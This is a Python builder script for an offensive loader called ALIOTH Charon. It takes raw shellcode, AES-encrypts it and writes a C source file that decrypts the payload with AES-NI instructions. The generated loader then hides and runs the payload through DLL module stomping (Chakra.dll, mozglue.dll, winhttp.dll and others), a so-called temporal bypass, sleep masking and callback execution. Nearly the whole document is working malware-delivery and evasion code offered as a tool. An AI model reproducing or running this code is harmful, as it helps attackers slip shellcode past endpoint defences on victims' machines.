#!/usr/bin/env python3
"""
ALIOTH Charon Artifact Builder
Author: sn0x
"""

import sys
import os
import argparse
import random
import struct
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def rc4_encrypt(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    out = bytearray()
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def aes_encrypt(key, iv, data):
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len]) * pad_len
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data)

def bytes_to_c_array(data, name):
    lines = []
    lines.append(f"static const unsigned char {name}[{len(data)}] = {{")
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        line = "    " + ", ".join(f"0x{b:02X}" for b in chunk)
        if i + 16 < len(data):
            line += ","
        lines.append(line)
    lines.append("};")
    lines.append(f"static const DWORD {name}_LEN = {len(data)};")
    return "\n".join(lines)

def generate_charon_artifact(args):
    with open(args.payload, "rb") as f:
        shellcode = f.read()
    
    original_size = len(shellcode)
    
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    nonce = get_random_bytes(12)
    
    encrypted = aes_encrypt(key[:16], iv, shellcode)
    
    c_arrays = []
    c_arrays.append(bytes_to_c_array(encrypted, "g_Payload_Encrypted"))
    c_arrays.append(f"static const BYTE g_Payload_Key[32] = {{{', '.join(f'0x{b:02X}' for b in key)}}};")
    c_arrays.append(f"static const BYTE g_Payload_IV[16] = {{{', '.join(f'0x{b:02X}' for b in iv)}}};")
    c_arrays.append(f"static const BYTE g_Payload_Nonce[12] = {{{', '.join(f'0x{b:02X}' for b in nonce)}}};")
    c_arrays.append(f"static const DWORD g_Payload_Size = {len(encrypted)};")
    c_arrays.append(f"static const DWORD g_Payload_OriginalSize = {original_size};")
    
    target_idx = 0
    targets = ["Chakra.dll", "edgehtml.dll", "mozglue.dll", "vcruntime140.dll", "msvcrt.dll", "winhttp.dll", "iertutil.dll"]
    for i, t in enumerate(targets):
        if args.target.lower() == t.lower():
            target_idx = i
            break
    
    template = f'''#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wmmintrin.h>
#include "..\\..\\core\\ALIOTH.h"

#pragma optimize("", off)

/* ALIOTH Charon Artifact - AUTO-GENERATED
 * Target: {args.target}
 * Original Size: {original_size} bytes
 */

/* Encrypted Payload */
{chr(10).join(c_arrays)}

/* Stomp Targets */
STOMP_TARGET g_StompTargets[MAX_STOMP_TARGETS] = {{
    {{"Chakra.dll",         "", 0, NULL, FALSE}},
    {{"edgehtml.dll",       "", 0, NULL, FALSE}},
    {{"mozglue.dll",        "", 0, NULL, FALSE}},
    {{"vcruntime140.dll",   "", 0, NULL, FALSE}},
    {{"vcruntime140_1.dll", "", 0, NULL, FALSE}},
    {{"msvcrt.dll",         "", 0, NULL, FALSE}},
    {{"winhttp.dll",        "", 0, NULL, FALSE}},
    {{"iertutil.dll",       "", 0, NULL, FALSE}},
}};

int main() {{
    if (!ALIOTHInit()) return 1;
    
    if (!CharonScanStompTargets()) return 1;
    
    DWORD dwTargetIdx = {target_idx};
    if (dwTargetIdx >= MAX_STOMP_TARGETS || !g_StompTargets[dwTargetIdx].bAvailable) {{
        dwTargetIdx = CharonFindBestTarget(g_Payload_OriginalSize);
    }}
    
    /* Decrypt payload */
    PBYTE pDecrypted = ALIOTHAllocVirtualMemory(g_Payload_OriginalSize, PAGE_READWRITE);
    memcpy(pDecrypted, g_Payload_Encrypted, g_Payload_Size);
    
    /* AES-NI decrypt */
    __m128i roundKeys[11];
    __m128i key = _mm_loadu_si128((__m128i*)g_Payload_Key);
    roundKeys[0] = key;
    
    for (int r = 1; r <= 10; r++) {{
        __m128i temp = _mm_aeskeygenassist_si128(key, r);
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, _mm_shuffle_epi32(temp, 0xFF));
        roundKeys[r] = key;
    }}
    
    for (int i = 1; i < 10; i++) roundKeys[i] = _mm_aesimc_si128(roundKeys[i]);
    
    __m128i iv = _mm_loadu_si128((__m128i*)g_Payload_IV);
    
    for (DWORD i = 0; i < g_Payload_Size; i += 16) {{
        __m128i block = _mm_loadu_si128((__m128i*)(pDecrypted + i));
        __m128i state = _mm_xor_si128(block, roundKeys[10]);
        
        state = _mm_aesdec_si128(state, roundKeys[9]);
        state = _mm_aesdec_si128(state, roundKeys[8]);
        state = _mm_aesdec_si128(state, roundKeys[7]);
        state = _mm_aesdec_si128(state, roundKeys[6]);
        state = _mm_aesdec_si128(state, roundKeys[5]);
        state = _mm_aesdec_si128(state, roundKeys[4]);
        state = _mm_aesdec_si128(state, roundKeys[3]);
        state = _mm_aesdec_si128(state, roundKeys[2]);
        state = _mm_aesdec_si128(state, roundKeys[1]);
        state = _mm_aesdeclast_si128(state, roundKeys[0]);
        
        state = _mm_xor_si128(state, iv);
        iv = block;
        
        _mm_storeu_si128((__m128i*)(pDecrypted + i), state);
    }}
    
    /* Temporal bypass */
    PVOID pExecMem = CharonTemporalBypass(pDecrypted, g_Payload_OriginalSize);
    if (!pExecMem) return 1;
    
    /* Sleep mask */
    CharonSleepMaskInit(pExecMem, g_Payload_OriginalSize);
    CharonSleepMaskEnterSleep(5000);
    CharonSleepMaskDecrypt();
    
    /* Execute */
    CharonExecuteViaCallback(pExecMem);
    
    ALIOTHCleanup();
    return 0;
}}
#pragma optimize("", on)
'''
    
    with open(args.output, "w") as f:
        f.write(template)
    
    print(f"[+] Generated {args.output}")

def main():
    parser = argparse.ArgumentParser(description="ALIOTH Charon Artifact Builder")
    parser.add_argument("--payload", required=True, help="Raw shellcode file")
    parser.add_argument("--target", default="Chakra.dll", help="Target DLL for stomping")
    parser.add_argument("--output", default="artifact.c", help="Output C file")
    args = parser.parse_args()
    
    if not os.path.exists(args.payload):
        print(f"[!] Payload not found: {args.payload}")
        sys.exit(1)
    
    generate_charon_artifact(args)

if __name__ == "__main__":
    main()
